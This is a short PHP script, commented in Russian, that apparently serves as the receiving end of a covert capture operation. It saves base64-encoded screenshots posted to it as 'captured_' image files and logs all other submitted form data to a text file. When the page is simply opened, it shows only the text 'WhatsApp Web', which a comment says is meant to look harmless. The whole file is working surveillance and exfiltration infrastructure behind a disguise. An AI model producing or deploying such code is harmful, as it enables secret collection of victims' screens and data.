<?php
// Получаем данные POST (например, снимки экрана)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if ($input && isset($input['image'])) {
        $data = base64_decode($input['image']);
        $filename = 'captured_' . time() . '.jpg';
        file_put_contents($filename, $data);
        echo 'OK';
    } else {
        // Сохраняем логи, если есть другие данные
        file_put_contents('log.txt', print_r($_POST, true), FILE_APPEND);
        echo 'Logged';
    }
} else {
    // Если просто открыли страницу, показываем что-то безобидное
    echo 'WhatsApp Web';
}
?>